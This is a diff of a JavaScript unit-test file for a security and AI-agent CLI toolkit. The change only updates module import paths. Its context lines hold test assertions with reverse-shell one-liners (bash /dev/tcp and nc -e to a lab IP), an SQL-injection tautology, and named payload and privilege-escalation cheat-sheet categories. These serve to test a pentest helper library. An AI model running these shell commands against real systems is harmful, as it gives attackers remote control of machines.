@@ -2,32 +2,32 @@
 // Sentinel/Nexus unit suite — runs the pure lib/ subsystems. `npm test`.
 // No framework, no deps: a tiny assert harness so it runs anywhere (CI included).
 const os = require("os"), fs = require("fs"), path = require("path");
-const { MODEL_PRICE, priceOf, isMechanical, shouldDelegate } = require("../lib/pricing");
-const { geminiParse, codexParse } = require("../lib/parsers");
-const { POLICY_DEFAULTS, globToRe, pathMatchesAny, policyCheck, auditLog, auditVerify } = require("../lib/policy");
-const { ENGINES, ENGINE_ORDER, engineCap } = require("../lib/engines");
-const { scanSecrets, maskSecrets, classifyDanger, compactOutput } = require("../lib/security");
-const { styleNames, styleDirective } = require("../lib/styles");
-const { mergeMemory } = require("../lib/memory");
-const { STYLES, allStyles, loadStyles } = require("../lib/styles");
-const { TOOL_CATALOG, discoverTools } = require("../lib/tools");
-const { createBgJobs, MAX_BUF } = require("../lib/bgjobs");
-const { SETTINGS, describe } = require("../lib/settings");
-const { pickCoderModel } = require("../lib/ollama");
-const { validatePolicy, validateTeam } = require("../lib/validate");
-const { oneline, extractJson } = require("../lib/text");
-const { frameDiff, diffTokens, wordHi } = require("../lib/diff");
-const { TOP_PORTS, parsePorts, idHash, parseCve, cidrCalc, ipToInt, inCidr } = require("../lib/scanutil");
-const { DONE_TOKEN, loopDecision, clampRounds, loopPrompt } = require("../lib/loop");
-const { defang, refang } = require("../lib/ioc");
-const { shannon, assess } = require("../lib/entropy");
-const { convert: epochConvert } = require("../lib/epoch");
-const { parseUrl } = require("../lib/urlparse");
-const { base32encode, base32decode } = require("../lib/base32");
-const { hotp, totp, secondsRemaining } = require("../lib/totp");
-const { decodeJwt, analyzeJwt } = require("../lib/jwt");
-const { parseUA } = require("../lib/useragent");
-const { portName, findByName, portLookup } = require("../lib/ports");
+const { MODEL_PRICE, priceOf, isMechanical, shouldDelegate } = require("../lib/nexus/pricing");
+const { geminiParse, codexParse } = require("../lib/nexus/parsers");
+const { POLICY_DEFAULTS, globToRe, pathMatchesAny, policyCheck, auditLog, auditVerify } = require("../lib/governance/policy");
+const { ENGINES, ENGINE_ORDER, engineCap } = require("../lib/nexus/engines");
+const { scanSecrets, maskSecrets, classifyDanger, compactOutput } = require("../lib/governance/security");
+const { styleNames, styleDirective } = require("../lib/cli/styles");
+const { mergeMemory } = require("../lib/nexus/memory");
+const { STYLES, allStyles, loadStyles } = require("../lib/cli/styles");
+const { TOOL_CATALOG, discoverTools } = require("../lib/nexus/tools");
+const { createBgJobs, MAX_BUF } = require("../lib/nexus/bgjobs");
+const { SETTINGS, describe } = require("../lib/cli/settings");
+const { pickCoderModel } = require("../lib/nexus/ollama");
+const { validatePolicy, validateTeam } = require("../lib/cli/validate");
+const { oneline, extractJson } = require("../lib/cli/text");
+const { frameDiff, diffTokens, wordHi } = require("../lib/cli/diff");
+const { TOP_PORTS, parsePorts, idHash, parseCve, cidrCalc, ipToInt, inCidr } = require("../lib/toolkit/scanutil");
+const { DONE_TOKEN, loopDecision, clampRounds, loopPrompt } = require("../lib/nexus/loop");
+const { defang, refang } = require("../lib/toolkit/ioc");
+const { shannon, assess } = require("../lib/toolkit/entropy");
+const { convert: epochConvert } = require("../lib/toolkit/epoch");
+const { parseUrl } = require("../lib/toolkit/urlparse");
+const { base32encode, base32decode } = require("../lib/toolkit/base32");
+const { hotp, totp, secondsRemaining } = require("../lib/toolkit/totp");
+const { decodeJwt, analyzeJwt } = require("../lib/toolkit/jwt");
+const { parseUA } = require("../lib/toolkit/useragent");
+const { portName, findByName, portLookup } = require("../lib/toolkit/ports");
 
 let pass = 0, fail = 0;
 const ok = (name, cond) => { if (cond) { pass++; } else { fail++; console.log("  \x1b[31mFAIL\x1b[0m " + name); } };
@@ -426,7 +426,7 @@ group("port <-> service lookup");
 
 group("command registry (batch 1)");
 {
-  const { CMDS, CMD_MAP } = require("../lib/registry");
+  const { CMDS, CMD_MAP } = require("../lib/cli/registry");
   const plain = { red: (s) => s, green: (s) => s, yellow: (s) => s, cyan: (s) => s, gray: (s) => s, bold: (s) => s };
   ok("names + aliases are unique", (() => { const seen = new Set(); for (const cmd of CMDS) { for (const n of [cmd.name, ...(cmd.aliases || [])]) { if (seen.has(n)) return false; seen.add(n); } } return true; })());
   ok("every run() returns a string", CMDS.every((cmd) => typeof cmd.run({ rest: [], c: plain }) === "string"));
@@ -496,7 +496,7 @@ group("no dead lib imports in sentinel.js");
 
 group("encoders (shared CLI + menu)");
 {
-  const { ENC } = require("../lib/encoders");
+  const { ENC } = require("../lib/toolkit/encoders");
   eq("op keys present", Object.keys(ENC).sort(), ["b64d", "b64e", "base32d", "base32e", "hexd", "hexe", "urld", "urle"]);
   ok("b64/hex/url/base32 all roundtrip", ["b64", "hex", "url", "base32"].every((t) => ENC[t + "d"](ENC[t + "e"]("Sentinel 42!")) === "Sentinel 42!"));
   eq("url encodes a space", ENC.urle("a b"), "a%20b");
@@ -505,7 +505,7 @@ group("encoders (shared CLI + menu)");
 
 group("hashing + password gen");
 {
-  const { ALGOS, GENPASS_CHARS, digests, genPass } = require("../lib/hashing");
+  const { ALGOS, GENPASS_CHARS, digests, genPass } = require("../lib/toolkit/hashing");
   const m = Object.fromEntries(digests("abc"));
   eq("algo order", ALGOS, ["md5", "sha1", "sha256", "sha512"]);
   eq("md5('abc') vector", m.md5, "900150983cd24fb0d6963f7d28e17f72");
@@ -520,7 +520,7 @@ group("hashing + password gen");
 
 group("cheat-sheets");
 {
-  const { CHEATS, cheatTopics } = require("../lib/cheats");
+  const { CHEATS, cheatTopics } = require("../lib/toolkit/cheats");
   eq("expected topics present", cheatTopics().sort(), ["cracking", "nmap", "privesc", "shells", "transfer", "web", "windows"]);
   ok("every topic has a non-empty string-array", cheatTopics().every((t) => Array.isArray(CHEATS[t]) && CHEATS[t].length > 0 && CHEATS[t].every((l) => typeof l === "string" && l.length)));
   ok("nmap cheats mention nmap", CHEATS.nmap.every((l) => l.includes("nmap")));
@@ -529,7 +529,7 @@ group("cheat-sheets");
 
 group("payload library");
 {
-  const { PAYLOADS_CLI, payloadClasses } = require("../lib/payloads");
+  const { PAYLOADS_CLI, payloadClasses } = require("../lib/toolkit/payloads");
   eq("expected classes present", payloadClasses().sort(), ["cmdi", "lfi", "sqli", "ssrf", "ssti", "xss"]);
   ok("every class has a non-empty string array", payloadClasses().every((c) => Array.isArray(PAYLOADS_CLI[c]) && PAYLOADS_CLI[c].length > 0 && PAYLOADS_CLI[c].every((p) => typeof p === "string" && p.length)));
   ok("sqli includes the canonical tautology", PAYLOADS_CLI.sqli.includes("' OR '1'='1"));
@@ -539,7 +539,7 @@ group("payload library");
 
 group("google dork builder");
 {
-  const { DORK_BASE, DORKS, dorkUrls } = require("../lib/dorks");
+  const { DORK_BASE, DORKS, dorkUrls } = require("../lib/toolkit/dorks");
   ok("catalog non-empty [label, query] pairs", DORKS.length >= 5 && DORKS.every((d) => d.length === 2 && d[0] && d[1]));
   const rows = dorkUrls("example.com");
   ok("one row per dork", rows.length === DORKS.length);
@@ -551,7 +551,7 @@ group("google dork builder");
 
 group("http status reference");
 {
-  const { HTTP_STATUS_MAP, statusClass, statusInfo } = require("../lib/httpstatus");
+  const { HTTP_STATUS_MAP, statusClass, statusInfo } = require("../lib/toolkit/httpstatus");
   ok("map covers common codes", HTTP_STATUS_MAP["200"] === "OK" && HTTP_STATUS_MAP["404"] === "Not Found" && HTTP_STATUS_MAP["503"] === "Service Unavailable");
   eq("statusInfo 200", statusInfo("200"), { code: "200", text: "OK", class: "2xx success" });
   eq("statusInfo 418", statusInfo(418), { code: "418", text: "I'm a teapot", class: "4xx client error" });
@@ -562,7 +562,7 @@ group("http status reference");
 
 group("reverse-shell payloads");
 {
-  const { SHELLS, revshell, shellLangs } = require("../lib/revshell");
+  const { SHELLS, revshell, shellLangs } = require("../lib/toolkit/revshell");
   ok("langs present", shellLangs().length >= 7 && shellLangs().includes("bash") && shellLangs().includes("powershell"));
   eq("bash exact", revshell("bash", "10.10.14.7", "4444"), "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1");
   eq("nc exact", revshell("nc", "10.10.14.7", "4444"), "nc -e /bin/sh 10.10.14.7 4444");
@@ -573,7 +573,7 @@ group("reverse-shell payloads");
 
 group("help reference (single source of truth)");
 {
-  const { COMMAND_GROUPS, documentedVerbs, renderCommands } = require("../lib/reference");
+  const { COMMAND_GROUPS, documentedVerbs, renderCommands } = require("../lib/cli/reference");
   ok("8 command groups, non-empty", COMMAND_GROUPS.length === 8 && COMMAND_GROUPS.every((g) => g.title && g.rows.length));
   ok("every row is [left, right] strings", COMMAND_GROUPS.every((g) => g.rows.every((r) => r.length === 2 && typeof r[0] === "string" && typeof r[1] === "string")));
   // DRIFT GUARD: every documented command verb must have a real dispatch handler —
@@ -581,7 +581,7 @@ group("help reference (single source of truth)");
   const src = fs.readFileSync(path.join(__dirname, "..", "sentinel.js"), "utf8");
   const dispatched = new Set();
   for (const m of src.matchAll(/cmd === "([^"]+)"/g)) dispatched.add(m[1]);
-  const { CMDS: REG } = require("../lib/registry");
+  const { CMDS: REG } = require("../lib/cli/registry");
   for (const cmd of REG) for (const n of [cmd.name, ...(cmd.aliases || [])]) dispatched.add(n);
   const undocumentedDrift = [...documentedVerbs()].filter((v) => !dispatched.has(v));
   eq("no documented command lacks a handler", undocumentedDrift, []);
@@ -595,7 +595,7 @@ group("help reference (single source of truth)");
 
 group("diceware passphrase");
 {
-  const { WORDS, genPassphrase, passphraseBits } = require("../lib/passphrase");
+  const { WORDS, genPassphrase, passphraseBits } = require("../lib/toolkit/passphrase");
   ok("wordlist non-trivial + unique + clean", WORDS.length >= 200 && new Set(WORDS).size === WORDS.length && WORDS.every((w) => /^[a-z]+$/.test(w)));
   // deterministic via injected rng: a fake that returns fixed indices
   const fake = (() => { let i = 0; const seq = [0, 1, 2, 3]; return () => seq[i++ % seq.length]; })();
@@ -609,7 +609,7 @@ group("diceware passphrase");
 
 group("usage ledger + chargeback report");
 {
-  const { appendUsage, loadUsage, summarize, renderReport, MONEY, TOK } = require("../lib/usage");
+  const { appendUsage, loadUsage, summarize, renderReport, MONEY, TOK } = require("../lib/governance/usage");
   const dir = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-usage-"));
   ok("appendUsage writes + loadUsage reads", (() => {
     appendUsage(dir, { ts: "2026-08-11T09:00:00Z", engine: "claude", model: "claude-opus-4-8", inTok: 1000, outTok: 500, cost: 0.04, seconds: 10, files: 2, commands: 1 });
@@ -632,8 +632,8 @@ group("usage ledger + chargeback report");
 
 group("operator/team attribution");
 {
-  const { resolveOperator } = require("../lib/identity");
-  const { summarize, renderReport } = require("../lib/usage");
+  const { resolveOperator } = require("../lib/governance/identity");
+  const { summarize, renderReport } = require("../lib/governance/usage");
   // env (SSO-provisioned) wins
   eq("env identity wins", resolveOperator({ env: { SENTINEL_OPERATOR: "alice", SENTINEL_TEAM: "platform" }, cwd: os.tmpdir() }), { operator: "alice", team: "platform", source: "sso-env" });
   // local config fallback
@@ -656,7 +656,7 @@ group("operator/team attribution");
 
 group("compliance bundle (SOC2 export)");
 {
-  const { buildBundle, verifyBundle, renderBundleMd, sha256 } = require("../lib/compliance");
+  const { buildBundle, verifyBundle, renderBundleMd, sha256 } = require("../lib/governance/compliance");
   const d = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-comp-")); fs.mkdirSync(path.join(d, ".nexus"));
   fs.writeFileSync(path.join(d, ".nexus", "usage.jsonl"), JSON.stringify({ ts: "2026-08-12T10:00:00Z", engine: "claude", model: "opus", inTok: 100, outTok: 50, cost: 0.02, operator: "alice", team: "platform" }) + "\n");
   fs.writeFileSync(path.join(d, ".nexus", "policy.json"), JSON.stringify({ protectedPaths: [".env"], audit: true }));
